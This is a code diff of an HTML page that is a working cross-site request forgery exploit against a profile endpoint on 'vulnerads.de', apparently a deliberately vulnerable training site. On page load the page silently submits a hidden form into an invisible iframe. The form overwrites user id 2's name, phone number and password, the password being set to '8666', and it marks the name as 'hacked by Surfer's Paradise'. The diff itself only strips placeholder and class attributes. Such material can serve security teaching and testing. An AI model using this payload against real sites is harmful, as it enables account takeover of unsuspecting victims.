@@ -6,15 +6,15 @@
 <body>
 	<iframe style="display:none" name="csrf-frame"></iframe>
 	<form id="profile" method='POST' accept-charset="utf-8" action='https://vulnerads.de/profile' target="csrf-frame">
-        <input type="hidden" id="username" name="username" placeholder="Benutzername" class="form-control" value="g" />
-        <input type="hidden" id="firstname" name="firstname" placeholder="Vorname" class="form-control" value="Gustav" />
-        <input type="hidden" id="lastname" name="lastname" placeholder="Nachname" class="form-control" value="Gans, gehackt von Surfer's Paradise" />
-        <input type="hidden" id="creditcardnumber" name="creditcardnumber" placeholder="Kreditkartennummer" class="form-control" value="" />
-        <input type="hidden" id="phonenumber" name="phonenumber" placeholder="Telefonnummer" class="form-control" value="+49 (451) 20955152" />
-        <input type="hidden" id="zip" name="zip" placeholder="PLZ" class="form-control" value="23568" />
-        <input type="hidden" id="town" name="town" placeholder="Ort" class="form-control" value="L&uuml;beck" />
-        <input type="hidden" id="password" name="password" placeholder="Passwort" class="form-control" value="8666" />
-        <input type="hidden" id="password2" name="password2" placeholder="Passwort wiederholen" class="form-control" value="8666" />
+        <input type="hidden" id="username" name="username" value="g" />
+        <input type="hidden" id="firstname" name="firstname" value="Gustav" />
+        <input type="hidden" id="lastname" name="lastname" value="Gans, gehackt von Surfer's Paradise" />
+        <input type="hidden" id="creditcardnumber" name="creditcardnumber" value="" />
+        <input type="hidden" id="phonenumber" name="phonenumber"value="+49 (451) 20955152" />
+        <input type="hidden" id="zip" name="zip" value="23568" />
+        <input type="hidden" id="town" name="town" value="L&uuml;beck" />
+        <input type="hidden" id="password" name="password" value="8666" />
+        <input type="hidden" id="password2" name="password2" value="8666" />
         <input id="userid" name="userid" type="hidden" value="2" />
 	</form>
 	<script>document.getElementById("profile").submit();</script>
